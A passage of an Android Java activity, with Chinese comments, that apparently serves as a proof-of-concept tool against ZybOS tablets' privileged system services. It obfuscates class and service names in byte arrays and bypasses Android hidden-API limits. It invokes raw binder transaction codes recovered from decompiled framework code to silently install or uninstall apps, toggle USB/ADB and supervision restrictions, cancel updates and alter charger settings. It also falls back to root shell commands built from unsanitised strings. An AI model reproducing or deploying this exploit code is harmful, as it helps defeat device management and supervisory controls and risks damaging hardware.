                Obfuscator.dec3(new byte[]{(byte)0xc9, (byte)0x13, (byte)0x7d, (byte)0xda, (byte)0x12, (byte)0x70, (byte)0xcc, (byte)0x53, (byte)0x76, (byte)0xdb, (byte)0x53, (byte)0x43, (byte)0xd1, (byte)0x1f, (byte)0x76, (byte)0xdb, (byte)0x2e, (byte)0x60, (byte)0xdb, (byte)0x3c, (byte)0x69, (byte)0xc1, (byte)0x30, (byte)0x78, (byte)0xc6, (byte)0x1c, (byte)0x7e, (byte)0xcd, (byte)0x0f, (byte)0x3d, (byte)0xfb, (byte)0x09, (byte)0x6c, (byte)0xca, (byte)0x59, (byte)0x49, (byte)0xda, (byte)0x12, (byte)0x61, (byte)0xd1}, (byte)0xa8, (byte)0x7d, (byte)0x19),
                Obfuscator.dec3(new byte[]{(byte)0x7b, (byte)0x47, (byte)0x25, (byte)0x36, (byte)0x52, (byte)0x31, (byte)0x7a, (byte)0x47, (byte)0x3b, (byte)0x36, (byte)0x72, (byte)0x31, (byte)0x7a, (byte)0x47, (byte)0x3b, (byte)0x4b, (byte)0x51, (byte)0x3b, (byte)0x59, (byte)0x58, (byte)0x21, (byte)0x55, (byte)0x49, (byte)0x26, (byte)0x79, (byte)0x4f, (byte)0x2d, (byte)0x6a}, (byte)0x18, (byte)0x28, (byte)0x48),
                Obfuscator.dec3(new byte[]{(byte)0x2d, (byte)0xfc, (byte)0xcf, (byte)0x3e, (byte)0xfd, (byte)0xc2, (byte)0x28, (byte)0xbc, (byte)0xd1, (byte)0x35, (byte)0xf0, (byte)0xc4, (byte)0x3f, (byte)0xbc, (byte)0xf1, (byte)0x35, (byte)0xf0, (byte)0xc4, (byte)0x3f, (byte)0xc1, (byte)0xd2, (byte)0x3f, (byte)0xd3, (byte)0xdb, (byte)0x25, (byte)0xdf, (byte)0xca, (byte)0x22, (byte)0xf3, (byte)0xcc, (byte)0x29, (byte)0xe0}, (byte)0x4c, (byte)0x92, (byte)0xab),
                Obfuscator.dec3(new byte[]{(byte)0x74, (byte)0xcf, (byte)0x2e, (byte)0x39, (byte)0xc1, (byte)0x2d, (byte)0x73, (byte)0xd2, (byte)0x2c, (byte)0x7e, (byte)0xc4, (byte)0x6d, (byte)0x7e, (byte)0xce, (byte)0x37, (byte)0x72, (byte)0xd2, (byte)0x2d, (byte)0x76, (byte)0xcc, (byte)0x6d, (byte)0x78, (byte)0xd3, (byte)0x6d, (byte)0x4d, (byte)0xd9, (byte)0x21, (byte)0x78, (byte)0xd3, (byte)0x10, (byte)0x6e, (byte)0xd3, (byte)0x02, (byte)0x67, (byte)0xc9, (byte)0x0e, (byte)0x76, (byte)0xce, (byte)0x22, (byte)0x70, (byte)0xc5, (byte)0x31}, (byte)0x17, (byte)0xa0, (byte)0x43)
            };
            for (String clsName : classNames) {
                if (zybosCls != null) break;
                try {
                    zybosCls = Class.forName(clsName);
                    appendLog("✓ 类通过 [" + clsName + "] 加载成功");
                } catch (ClassNotFoundException e) {
                    // 尝试系统ClassLoader
                    try {
                        zybosCls = ClassLoader.getSystemClassLoader().loadClass(clsName);
                        appendLog("✓ 类通过系统ClassLoader [" + clsName + "] 加载成功");
                    } catch (ClassNotFoundException e2) {
                        // 继续尝试下一个类名
                    }
                }
            }
            if (zybosCls == null) {
                appendLog("✗ ZybosSysApiManager类未找到，使用服务代理类");
                zybosCls = zybosService.getClass();
            }

            // 3. 检测可用方法
            Method[] allMethods = collectAllMethods();
            List<String> availableMethods = new ArrayList<>();
            for (Method m : allMethods) {
                String name = m.getName();
                if (name.contains("silent") || name.contains("Disallow") ||
                    name.contains("cancel") || name.contains("Install") ||
                    name.contains("Uninstall") || name.contains("USB") ||
                    name.contains("Package") || name.contains("Class") ||
                    name.contains("Update") || name.contains("Supervise") ||
                    name.contains("OTA") || name.contains("Dev") ||
                    name.contains("keep") || name.contains("Background") ||
                    name.contains("Display") || name.contains("Night") ||
                    name.contains("Battery") || name.contains("Charger") ||
                    name.contains("Hardware") || name.contains("Sysfs") ||
                    name.contains("Dnd") || name.contains("Dns") ||
                    name.contains("Power") || name.contains(Obfuscator.dec(new byte[]{(byte)0xc3, (byte)0xc0, (byte)0xcc, (byte)0xc4, (byte)0xfc, (byte)0xcc, (byte)0xdd, (byte)0xca, (byte)0xca, (byte)0xc1}, (byte)0xaf)) ||
                    name.contains("Nami") || name.contains("Adb") ||
                    name.contains("Browser") || name.contains("White") ||
                    name.contains("Charging")) {
                    availableMethods.add(name);
                }
            }

            if (!availableMethods.isEmpty()) {
                appendLog("✓ 发现 " + availableMethods.size() + " 个关键方法:");
                for (String methodName : availableMethods) {
                    appendLog("  - " + methodName);
                }
                zybosAvailable = true;
                final int methodCount = availableMethods.size();
                runOnUiThread(new Runnable() {
                    @Override public void run() {
                        statusText.setText("状态: 可用 ✓ (" + methodCount + "个方法)");
                        statusText.setTextColor(0xFF4CAF50);
                    }
                });
            } else {
                appendLog("⚠ 未发现关键方法，可能版本不兼容");
                appendLog("全部方法数: " + allMethods.length);
                zybosAvailable = true;
                runOnUiThread(new Runnable() {
                    @Override public void run() {
                        statusText.setText("状态: 部分可用");
                        statusText.setTextColor(0xFFFF9800);
                    }
                });
            }

        } catch (final Throwable e) {
            appendLog("✗ 检测异常: " + (e.getMessage() != null ? e.getMessage() : e.getClass().getSimpleName()));
            runOnUiThread(new Runnable() {
                @Override public void run() {
                    statusText.setText("状态: 检测失败");
                    statusText.setTextColor(getResources().getColor(R.color.md3_error));
                }
            });
        }

        // 同时检测 zybos_process 进程管理服务
        if (zybosAvailable) {
            detectZybosProcessService();
        }
            }
        });
    }

    // ==================== 反射辅助方法 ====================

    /**
     * 反射查找方法（参考JC Code V3的findMethod，含unchecked回退）
     */
    private Method findMethod(String name, Class<?>... types) {
        return findMethodOn(zybosCls, name, types);
    }

    /**
     * 在指定类上反射查找方法（含unchecked回退），供zybos_manager与zybos_process复用
     */
    private Method findMethodOn(Class<?> cls, String name, Class<?>... types) {
        if (cls == null) {
            appendLog("    [!] findMethodOn: cls=null");
            return null;
        }
        Method found = null;
        Class<?>[] paramTypes = (types != null) ? types : new Class<?>[0];

        // 先尝试getDeclaredMethod
        try {
            found = cls.getDeclaredMethod(name, paramTypes);
        } catch (NoSuchMethodException e) {
            // 继续
        }

        // 再尝试getMethod
        if (found == null) {
            try {
                found = cls.getMethod(name, paramTypes);
            } catch (NoSuchMethodException e) {
                // 继续
            }
        }

        if (found != null) {
            found.setAccessible(true);
            return found;
        }

        // 回退1：遍历所有DeclaredMethods查找名称匹配
        try {
            Method[] declared = cls.getDeclaredMethods();
            for (Method m : declared) {
                if (m.getName().equals(name)) {
                    m.setAccessible(true);
                    return m;
                }
            }
        } catch (Throwable e) {
            // 继续
        }

        // 回退2：遍历所有Methods查找名称匹配
        try {
            Method[] publicMethods = cls.getMethods();
            for (Method m : publicMethods) {
                if (m.getName().equals(name)) {
                    m.setAccessible(true);
                    return m;
                }
            }
        } catch (Throwable e) {
            // 继续
        }

        // 回退3：在接口中查找（代理类可能只实现了接口）
        try {
            Class<?>[] interfaces = cls.getInterfaces();
            for (Class<?> iface : interfaces) {
                try {
                    Method m = iface.getMethod(name, paramTypes);
                    if (m != null) {
                        m.setAccessible(true);
                        return m;
                    }
                } catch (NoSuchMethodException e) {
                    // 在接口的声明方法中查找
                    for (Method m : iface.getDeclaredMethods()) {
                        if (m.getName().equals(name)) {
                            m.setAccessible(true);
                            return m;
                        }
                    }
                }
            }
        } catch (Throwable e) {
            // 继续
        }

        // 回退4：使用uncheckedMethod（Android 11+ Hidden API bypass）
        if (uncheckedMethod != null) {
            try {
                Method[] methods = (Method[]) uncheckedMethod.invoke(cls, false);
                if (methods != null) {
                    for (Method m : methods) {
                        if (m != null && m.getName().equals(name)) {
                            m.setAccessible(true);
                            return m;
                        }
                    }
                }
            } catch (Throwable e) {
                // 继续
            }
        }

        // 回退5：在父类中查找
        Class<?> superCls = cls.getSuperclass();
        if (superCls != null && superCls != Object.class) {
            Method m = findMethodOn(superCls, name, types);
            if (m != null) return m;
        }

        return null;
    }

    private Method[] collectAllMethods() {
        List<Method> all = new ArrayList<>();
        if (zybosCls == null) return all.toArray(new Method[0]);
        // 从声明的方法收集
        try {
            Method[] declared = zybosCls.getDeclaredMethods();
            if (declared.length > 0) {
                Collections.addAll(all, declared);
            }
        } catch (Throwable e) { }

        // 从public方法收集
        try {
            Method[] publicMethods = zybosCls.getMethods();
            for (Method m : publicMethods) {
                if (!all.contains(m)) all.add(m);
            }
        } catch (Throwable e) { }

        // 从接口方法收集
        try {
            for (Class<?> iface : zybosCls.getInterfaces()) {
                try {
                    for (Method m : iface.getDeclaredMethods()) {
                        if (!all.contains(m)) all.add(m);
                    }
                } catch (Throwable e) { }
            }
        } catch (Throwable e) { }

        // 使用uncheckedMethod
        if (uncheckedMethod != null && all.isEmpty()) {
            try {
                Method[] methods = (Method[]) uncheckedMethod.invoke(zybosCls, false);
                if (methods != null && methods.length > 0) {
                    for (Method m : methods) {
                        if (m != null && !all.contains(m)) all.add(m);
                    }
                }
            } catch (Throwable e2) { }
        }

        return all.toArray(new Method[0]);
    }

    // 后台线程执行辅助方法
    private void runAsync(Runnable r) {
        new Thread(r, "zybos-bg").start();
    }

    // ==================== Transact 直接调用基础设施 (来自 framework 反编译) ====================

    private static final String ZYBOS_DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0xa9, (byte)0xd9, (byte)0xa0, (byte)0xba, (byte)0xd8, (byte)0xad, (byte)0xac, (byte)0x99, (byte)0xab, (byte)0xbb, (byte)0x99, (byte)0x8d, (byte)0x92, (byte)0xce, (byte)0xa6, (byte)0xa7, (byte)0xc4, (byte)0x97, (byte)0xb1, (byte)0xc4, (byte)0x85, (byte)0xb8, (byte)0xde, (byte)0x89, (byte)0xa9, (byte)0xd9, (byte)0xa5, (byte)0xaf, (byte)0xd2, (byte)0xb6}, (byte)0xc8, (byte)0xb7, (byte)0xc4);

    /** 方法名 -> 事务码映射表 (来自 IZybosSysApiManager$Stub 反编译) */
    private static int getTransactCode(String methodName) {
        switch (methodName) {
            // 安装管理
            case "isDisallowPackage":return 0x01;
            case "isDisallowClass":return 0x02;
            case "isDisallowInstallPackage":return 0x03;
            case "setPackageListDisallow":return 0x04;
            case "setClassListDisallow":return 0x05;
            case "setInstallPackageDisallow":return 0x06;
            // USB/ADB
            case "setUSBDisallow":return 0x16;
            case "isDisallowUSB":return 0x17;
            // 安装/卸载
            case "silentUninstallApk":return 0x18;
            case "silentInstallApk":return 0x19;
            case "setClassListAllow":return 0x1a;
            case "isAllowClass":return 0x1b;
            // 系统控制
            case "lockScreen":return 0x1c;
            case "cancelUpdate":return 0x1d;
            // 免打扰
            case "addInDndList":return 0x1e;
            case "removeFromDndList":return 0x1f;
            case "isInDndList":return 0x20;
            // 浏览器/安装限制
            case "setDefaultBrowser":return 0x21;
            case "isSilentInstallDisallow":return 0x22;
            // 显示设置
            case "setNightDisplayActivated":return 0x12;
            case "setNightDisplayColorTemperature":return 0x13;
            case "getNightDisplayColorTemperature":return 0x14;
            case "isNightDisplayActivated":return 0x15;
            case "setDisplayDaltonizerEnabled":return 0x23;
            case "isInDisplayDaltonizerMode":return 0x24;
            // ADB/触控笔/电源
            case "isAdbEnabled":return 0x25;
            case "setStylusEnabled":return 0x26;
            case "updatePowerOnTime":return 0x27;
            // MTK 显示调节
            case "setMtkPQColorTemperatureEnable":return 0x28;
            case "setMtkPQGammaIndex":return 0x29;
            case "getMtkPQGammaDefaultValue":return 0x2a;
            case "getMtkPQGammaMinValue":return 0x2b;
            case "getMtkPQGammaMaxValue":return 0x2c;
            case "getMtkPQGammaCurrentValue":return 0x2d;
            // 电池/充电
            case "getChargerAgingCV":return 0x2e;
            case "setChargerAgingCV":return 0x2f;
            case "setChargerIeoc":return 0x30;
            case "getChargerIbat":return 0x31;
            case "getBatteryAgingFactor":return 0x32;
            case "getBatteryCycleCount":return 0x33;
            case "getBatteryHealth":return 0x34;
            // DNS/硬件
            case "setZybOsDnsDotMode":return 0x35;
            case "getZybOsDnsDotMode":return 0x36;
            case "getZybHardwareCompA":return 0x37;
            case "getZybHardwareCompB":return 0x38;
            case "getZybHardwareCompC":return 0x39;
            case "getZybHardwareCompD":return 0x3a;
            case "getZybHardwareCompE":return 0x3b;
            case "getZybHardwareCompF":return 0x3c;
            case "getZybHardwareCompG":return 0x3d;
            case "getZybHardwareCompH":return 0x3e;
            case "getZybHardwareCompI":return 0x3f;
            case "getZybHardwareCompJ":return 0x40;
            // 注意: 0x07-0x0d, 0x0e-0x11, 0x41-0x42 是监听器/回调，不包含
            default: return -1;
        }
    }

    /** 返回值类型: "void", "boolean", "int", "String" */
    private static String getReturnType(String methodName) {
        switch (methodName) {
            case "isDisallowPackage":case "isDisallowClass": case "isDisallowInstallPackage":
            case "isAllowClass":case "isDisallowUSB": case "isInDndList":
            case "isSilentInstallDisallow":case "isInDisplayDaltonizerMode":
            case "isAdbEnabled":case "isNightDisplayActivated":
            case "setDefaultBrowser":case "setNightDisplayColorTemperature":
                return "boolean";
            case "getNightDisplayColorTemperature":case "getZybOsDnsDotMode":
            case "getMtkPQGammaDefaultValue":case "getMtkPQGammaMinValue":
            case "getMtkPQGammaMaxValue":case "getMtkPQGammaCurrentValue":
                return "int";
            case "getChargerAgingCV":case "getChargerIbat":
            case "getBatteryAgingFactor":case "getBatteryCycleCount":
            case "getBatteryHealth":
            case "getZybHardwareCompA":case "getZybHardwareCompB": case "getZybHardwareCompC":
            case "getZybHardwareCompD":case "getZybHardwareCompE": case "getZybHardwareCompF":
            case "getZybHardwareCompG":case "getZybHardwareCompH": case "getZybHardwareCompI":
            case "getZybHardwareCompJ":
                return "String";
            default:
                return "void";
        }
    }

    /** updatePowerOnTime 使用 FLAG_ONEWAY */
    private static boolean isOneWay(String methodName) {
        return "updatePowerOnTime".equals(methodName);
    }

    /** 写入参数到 Parcel */
    @SuppressWarnings("unchecked")
    private void writeParams(Parcel data, Object[] args) {
        for (Object arg : args) {
            if (arg instanceof String) {
                data.writeString((String) arg);
            } else if (arg instanceof Boolean) {
                data.writeInt((Boolean) arg ? 1 : 0);
            } else if (arg instanceof Integer) {
                data.writeInt((Integer) arg);
            } else if (arg instanceof List) {
                data.writeStringList((List<String>) arg);
            }
        }
    }

    /** Transact 调用 (void 返回) - 绕过 Hidden API */
    private boolean transactInvokeDirect(String methodName, Object... args) {
        int code = getTransactCode(methodName);
        if (code < 0 || zybosBinder == null) return false;

        Parcel data = Parcel.obtain();
        Parcel reply = isOneWay(methodName) ? null : Parcel.obtain();
        try {
            data.writeInterfaceToken(ZYBOS_DESCRIPTOR);
            writeParams(data, args);

            int flags = isOneWay(methodName) ? IBinder.FLAG_ONEWAY : 0;
            boolean ok = zybosBinder.transact(code, data, reply, flags);
            if (!ok) {
                appendLog("[!] transact(" + methodName + "/0x" + Integer.toHexString(code) + ") 失败");
                return false;
            }
            if (reply != null) {
                reply.readException();
            }
            appendLog("[+] " + methodName + " OK (transact 0x" + Integer.toHexString(code) + ")");
            return true;
        } catch (Throwable e) {
            String msg = e.getMessage();
            if (msg == null && e.getCause() != null) msg = e.getCause().getMessage();
            appendLog("[!] " + methodName + " transact: " + (msg != null ? msg : e.getClass().getSimpleName()));
            return false;
        } finally {
            data.recycle();
            if (reply != null) reply.recycle();
        }
    }

    /** Transact 调用 (有返回值) - 绕过 Hidden API */
    private Object transactInvokeGetDirect(String methodName, Object... args) {
        int code = getTransactCode(methodName);
        if (code < 0 || zybosBinder == null) return null;

        String retType = getReturnType(methodName);
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(ZYBOS_DESCRIPTOR);
            writeParams(data, args);

            boolean ok = zybosBinder.transact(code, data, reply, 0);
            if (!ok) {
                appendLog("[!] transact(" + methodName + "/0x" + Integer.toHexString(code) + ") 失败");
                return null;
            }
            reply.readException();

            Object result = null;
            switch (retType) {
                case "boolean": result = reply.readInt() != 0; break;
                case "int": result = reply.readInt(); break;
                case "String": result = reply.readString(); break;
            }
            appendLog("[+] " + methodName + " = " + (result != null ? result.toString() : "null") + " (transact 0x" + Integer.toHexString(code) + ")");
            return result;
        } catch (Throwable e) {
            String msg = e.getMessage();
            if (msg == null && e.getCause() != null) msg = e.getCause().getMessage();
            appendLog("[!] " + methodName + " transact: " + (msg != null ? msg : e.getClass().getSimpleName()));
            return null;
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    // ==================== 统一调用层: transact 优先, 反射回退 ====================

    /** 同步调用 (void返回) - 先尝试 transact, 失败则回退反射 */
    private boolean tryInvokeDirect(String name, Class<?>[] types, Object... args) {
        // 1. 优先使用 transact (完全绕过 Hidden API)
        int code = getTransactCode(name);
        if (code >= 0 && zybosBinder != null) {
            if (transactInvokeDirect(name, args)) return true;
            appendLog("[*] transact 失败, 尝试反射回退...");
        }
        // 2. 回退到反射
        try {
            Method m = findMethod(name, types);
            if (m == null) {
                appendLog("[!] " + name + " 未找到 (transact+反射均失败)");
                // 3. 尝试 root shell 通用回退
                return tryRootShellFallback(name, args);
            }
            m.invoke(zybosService, args);
            appendLog("[+] " + name + " OK (反射)");
            return true;
        } catch (Throwable e) {
            String msg = e.getMessage();
            if (msg == null && e.getCause() != null) msg = e.getCause().getMessage();
            appendLog("[!] " + name + ": " + (msg != null ? msg : e.getClass().getSimpleName()));
            // 3. 尝试 root shell 通用回退
            return tryRootShellFallback(name, args);
        }
    }

    /** 通用root shell回退：尝试用 settings put / setprop 等命令 */
    private boolean tryRootShellFallback(String name, Object... args) {
        if (args == null || args.length == 0) return false;
        String lower = name.toLowerCase(java.util.Locale.ROOT);
        // 尝试 settings put 命令
        String val = String.valueOf(args[0]);
        if (args[0] instanceof Boolean) {
            val = ((Boolean)args[0]) ? "1" : "0";
        }
        // 尝试 secure namespace
        String result = execRootCapture("settings put secure " + lower + " " + val + " 2>/dev/null");
        if (result != null) {
            appendLog("[+] " + name + " OK (root shell: settings put secure)");
            return true;
        }
        // 尝试 global namespace
        result = execRootCapture("settings put global " + lower + " " + val + " 2>/dev/null");
        if (result != null) {
            appendLog("[+] " + name + " OK (root shell: settings put global)");
            return true;
        }
        // 尝试 system namespace
        result = execRootCapture("settings put system " + lower + " " + val + " 2>/dev/null");
        if (result != null) {
            appendLog("[+] " + name + " OK (root shell: settings put system)");
            return true;
        }
        appendLog("[*] root shell通用回退也失败");
        return false;
    }

    /** 通用root shell回退(getter)：尝试用 settings get 命令 */
    private Object tryRootShellGetFallback(String name) {
        String lower = name.toLowerCase(java.util.Locale.ROOT);
        // 尝试 secure namespace
        String output = execRootCapture("settings get secure " + lower + " 2>/dev/null");
        if (output != null && !output.isEmpty() && !"null".equals(output.trim())) {
            appendLog("[+] " + name + " = " + output.trim() + " (root shell: settings get secure)");
            return output.trim();
        }
        // 尝试 global namespace
        output = execRootCapture("settings get global " + lower + " 2>/dev/null");
        if (output != null && !output.isEmpty() && !"null".equals(output.trim())) {
            appendLog("[+] " + name + " = " + output.trim() + " (root shell: settings get global)");
            return output.trim();
        }
        // 尝试 system namespace
        output = execRootCapture("settings get system " + lower + " 2>/dev/null");
        if (output != null && !output.isEmpty() && !"null".equals(output.trim())) {
            appendLog("[+] " + name + " = " + output.trim() + " (root shell: settings get system)");
            return output.trim();
        }
        return null;
    }

    /** 同步调用 (有返回值) - 先尝试 transact, 失败则回退反射 */
    private Object tryInvokeGetDirect(String name, Class<?>[] types, Object... args) {
        // 1. 优先使用 transact
        int code = getTransactCode(name);
        if (code >= 0 && zybosBinder != null) {
            Object result = transactInvokeGetDirect(name, args);
            if (result != null) return result;
            appendLog("[*] transact 失败, 尝试反射回退...");
        }
        // 2. 回退到反射
        try {
            Method m = findMethod(name, types);
            if (m == null) {
                appendLog("[!] " + name + " 未找到 (transact+反射均失败)");
                // 3. 尝试 root shell 通用回退 (getter)
                return tryRootShellGetFallback(name);
            }
            Object result = m.invoke(zybosService, args);
            appendLog("[+] " + name + " = " + (result != null ? result.toString() : "null") + " (反射)");
            return result;
        } catch (Throwable e) {
            String msg = e.getMessage();
            if (msg == null && e.getCause() != null) msg = e.getCause().getMessage();
            appendLog("[!] " + name + ": " + (msg != null ? msg : e.getClass().getSimpleName()));
            // 3. 尝试 root shell 通用回退 (getter)
            return tryRootShellGetFallback(name);
        }
    }

    /**
     * 异步反射调用（自动在后台线程执行，避免阻塞主线程）
     */
    private void tryInvoke(final String name, final Class<?>[] types, final Object... args) {
        runAsync(new Runnable() {
            public void run() { tryInvokeDirect(name, types, args); }
        });
    }

    /**
     * 异步反射调用并捕获返回值，结果输出到日志（用于getter/查询类方法）
     */
    private void tryInvokeGet(final String name, final Class<?>[] types, final Object... args) {
        runAsync(new Runnable() {
            public void run() { tryInvokeGetDirect(name, types, args); }
        });
    }

    // ==================== 输入对话框辅助 ====================

    private interface OnInputListener {
        void onInput(String value);
    }

    private void showInputDialog(String title, String hint, String defaultVal, final OnInputListener callback) {
        final EditText input = new EditText(this);
        if (defaultVal != null) input.setText(defaultVal);
        if (hint != null) input.setHint(hint);
        new AlertDialog.Builder(this)
            .setTitle(title)
            .setView(input)
            .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                @Override public void onClick(DialogInterface d, int w) {
                    callback.onInput(input.getText().toString().trim());
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    // ==================== zybos_process 进程管理服务 ====================

    private boolean detectZybosProcessService() {
        appendLog("---------- 检测zybos_process服务 ----------");
        zybosProcessAvailable = false;
        zybosProcessService = null;
        zybosProcessCls = null;
        try {
            try {
                Class<?> serviceManagerCls = Class.forName(Obfuscator.dec3(new byte[]{(byte)0x2b, (byte)0x5a, (byte)0xa9, (byte)0x38, (byte)0x5b, (byte)0xa4, (byte)0x2e, (byte)0x1a, (byte)0xa2, (byte)0x39, (byte)0x1a, (byte)0x9e, (byte)0x2f, (byte)0x46, (byte)0xbb, (byte)0x23, (byte)0x57, (byte)0xa8, (byte)0x07, (byte)0x55, (byte)0xa3, (byte)0x2b, (byte)0x53, (byte)0xa8, (byte)0x38}, (byte)0x4a, (byte)0x34, (byte)0xcd));
                Method getServiceMethod = serviceManagerCls.getMethod(Obfuscator.dec(new byte[]{(byte)0xcc, (byte)0xce, (byte)0xdf, (byte)0xf8, (byte)0xce, (byte)0xd9, (byte)0xdd, (byte)0xc2, (byte)0xc8, (byte)0xce}, (byte)0xab), String.class);
                zybosProcessService = getServiceMethod.invoke(null, Obfuscator.dec(new byte[]{(byte)0x22, (byte)0x21, (byte)0x3a, (byte)0x37, (byte)0x2b, (byte)0x07, (byte)0x28, (byte)0x2a, (byte)0x37, (byte)0x3b, (byte)0x3d, (byte)0x2b, (byte)0x2b}, (byte)0x58));
            } catch (Throwable e1) {
                try {
                    zybosProcessService = getSystemService(Obfuscator.dec(new byte[]{(byte)0x22, (byte)0x21, (byte)0x3a, (byte)0x37, (byte)0x2b, (byte)0x07, (byte)0x28, (byte)0x2a, (byte)0x37, (byte)0x3b, (byte)0x3d, (byte)0x2b, (byte)0x2b}, (byte)0x58));
                } catch (Throwable e2) {
                    appendLog("getSystemService方式失败: " + (e2.getMessage() != null ? e2.getMessage() : e2.getClass().getSimpleName()));
                }
            }

            if (zybosProcessService == null) {
                appendLog("✗ zybos_process服务不存在");
                return false;
            }
            appendLog("✓ zybos_process服务已获取");
            appendLog("服务类: " + zybosProcessService.getClass().getName());

            String[] processClassNames = {
                "android.os.ZybosProcessManager",
                "android.os.ZybosProcessManager$Stub",
                "android.os.ZybosProcessManager$Stub$Proxy"
            };
            for (String clsName : processClassNames) {
                if (zybosProcessCls != null) break;
                try {
                    zybosProcessCls = Class.forName(clsName);
                    appendLog("✓ ZybosProcessManager类已加载 [" + clsName + "]");
                } catch (ClassNotFoundException e) {
                    try {
                        zybosProcessCls = ClassLoader.getSystemClassLoader().loadClass(clsName);
                        appendLog("✓ ZybosProcessManager类通过系统ClassLoader已加载 [" + clsName + "]");
                    } catch (ClassNotFoundException e2) {
                        // 继续
                    }
                }
            }
            if (zybosProcessCls == null) {
                zybosProcessCls = zybosProcessService.getClass();
                appendLog("使用服务类: " + zybosProcessCls.getName());
            }
            zybosProcessAvailable = true;
            return true;
        } catch (Throwable e) {
            appendLog("✗ zybos_process检测异常: " + (e.getMessage() != null ? e.getMessage() : e.getClass().getSimpleName()));
            zybosProcessAvailable = false;
            return false;
        }
    }

    private boolean checkProcessAvailable() {
        if (!zybosProcessAvailable || zybosProcessService == null) {
            if (!detectZybosProcessService()) {
                new AlertDialog.Builder(this)
                    .setTitle("进程管理服务不可用")
                    .setMessage("zybos_process 服务未检测到。\n\n可能原因:\n1. 设备不是ZybOS系统\n2. 服务未启动\n\n是否重新检测?")
                    .setPositiveButton("重新检测", new DialogInterface.OnClickListener() {
                        @Override public void onClick(DialogInterface dialog, int which) {
                            detectZybosProcessService();
                        }
                    })
                    .setNegativeButton("取消", null)
                    .show();
                return false;
            }
        }
        return true;
    }

    // 同步版进程管理反射调用（供已在后台线程中的代码使用）
    private boolean tryInvokeProcessDirect(String name, Class<?>[] types, Object... args) {
        try {
            Method m = findMethodOn(zybosProcessCls, name, types);
            if (m == null) {
                appendLog("[!] " + name + " 未找到");
                return false;
            }
            m.invoke(zybosProcessService, args);
            appendLog("[+] " + name + " OK");
            return true;
        } catch (Throwable e) {
            String msg = e.getMessage();
            if (msg == null && e.getCause() != null) msg = e.getCause().getMessage();
            appendLog("[!] " + name + ": " + (msg != null ? msg : e.getClass().getSimpleName()));
            return false;
        }
    }

    // 同步版进程管理反射调用并捕获返回值
    private Object tryInvokeProcessGetDirect(String name, Class<?>[] types, Object... args) {
        try {
            Method m = findMethodOn(zybosProcessCls, name, types);
            if (m == null) {
                appendLog("[!] " + name + " 未找到");
                return null;
            }
            Object result = m.invoke(zybosProcessService, args);
            appendLog("[+] " + name + " = " + (result != null ? result.toString() : "null"));
            return result;
        } catch (Throwable e) {
            String msg = e.getMessage();
            if (msg == null && e.getCause() != null) msg = e.getCause().getMessage();
            appendLog("[!] " + name + ": " + (msg != null ? msg : e.getClass().getSimpleName()));
            return null;
        }
    }

    // 异步版进程管理反射调用
    private void tryInvokeProcess(final String name, final Class<?>[] types, final Object... args) {
        runAsync(new Runnable() {
            public void run() { tryInvokeProcessDirect(name, types, args); }
        });
    }

    // 异步版进程管理反射调用并捕获返回值
    private void tryInvokeProcessGet(final String name, final Class<?>[] types, final Object... args) {
        runAsync(new Runnable() {
            public void run() { tryInvokeProcessGetDirect(name, types, args); }
        });
    }

    private boolean checkAvailable() {
        if (!zybosAvailable || zybosService == null) {
            new AlertDialog.Builder(this)
                .setTitle("Zybos服务不可用")
                .setMessage("ZybosSysApiManager 未检测到。\n\n可能原因:\n1. 设备不是ZybOS系统\n2. 系统版本不支持\n3. 服务未启动\n\n是否重新检测?")
                .setPositiveButton("重新检测", new DialogInterface.OnClickListener() {
                    @Override public void onClick(DialogInterface dialog, int which) {
                        detectZybosService();
                    }
                })
                .setNegativeButton("取消", null)
                .show();
            return false;
        }
        return true;
    }

    // ==================== 功能1: 安装APK (扫描+选择+手动) ====================

    private void doSelectInstall() {
        if (!checkAvailable()) return;

        new AlertDialog.Builder(this)
            .setTitle("安装APK")
            .setItems(new String[]{
                "📁 扫描设备APK文件",
                "📂 通过文件管理器选择",
                "✏️ 手动输入路径"
            }, new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface d, int which) {
                    if (which == 0) {
                        scanAndPickApk();
                    } else if (which == 1) {
                        openSystemFilePicker();
                    } else {
                        showManualInstallInput();
                    }
                }
            })
            .show();
    }

    private void scanAndPickApk() {
        appendLog("[*] 扫描APK文件...");
        showSnack("正在扫描APK文件...");

        // 在后台线程扫描文件系统，避免ANR
        runAsync(new Runnable() {
            @Override
            public void run() {
                final List<File> apkFiles = new ArrayList<>();
                String[] dirs = {
                    "/storage/emulated/0",
                    "/storage/emulated/0/Download",
                    "/storage/emulated/0/Documents",
                    "/storage/emulated/0/POC测试",
                    "/storage/emulated/0/APK",
                    "/storage/emulated/0/POC"
                };
                for (String dir : dirs) {
                    File d = new File(dir);
                    if (d.exists() && d.isDirectory()) {
                        File[] files = d.listFiles(new FilenameFilter() {
                            @Override
                            public boolean accept(File dir, String name) {
                                return name.toLowerCase().endsWith(".apk") && new File(dir, name).length() > 0;
                            }
                        });
                        if (files != null) {
                            apkFiles.addAll(Arrays.asList(files));
                        }
                    }
                }

                if (apkFiles.isEmpty()) {
                    appendLog("[!] 没找到APK文件");
                    runOnUiThread(new Runnable() {
                        @Override public void run() {
                            showSnack("未找到APK文件");
                            showManualInstallInput();
                        }
                    });
                    return;
                }

                final String[] names = new String[apkFiles.size()];
                for (int i = 0; i < apkFiles.size(); i++) {
                    File f = apkFiles.get(i);
                    names[i] = "[" + f.getParentFile().getName() + "] " + f.getName() + " (" + (f.length() / 1024) + "KB)";
                }

                runOnUiThread(new Runnable() {
                    @Override public void run() {
                        new AlertDialog.Builder(ZybosToolsActivity.this)
                            .setTitle("选择APK (" + apkFiles.size() + " 个)")
                            .setItems(names, new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface d, int w) {
                                    executeInstall(apkFiles.get(w).getAbsolutePath());
                                }
                            })
                            .setNegativeButton("手动输入", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface d, int w) {
                                    showManualInstallInput();
                                }
                            })
                            .show();
                    }
                });
            }
        });
    }

    private void openSystemFilePicker() {
        Intent intent = new Intent("android.intent.action.OPEN_DOCUMENT");
        intent.addCategory("android.intent.category.OPENABLE");
        intent.setType("application/vnd.android.package-archive");
        try {
            startActivityForResult(intent, 1001);
        } catch (Exception e) {
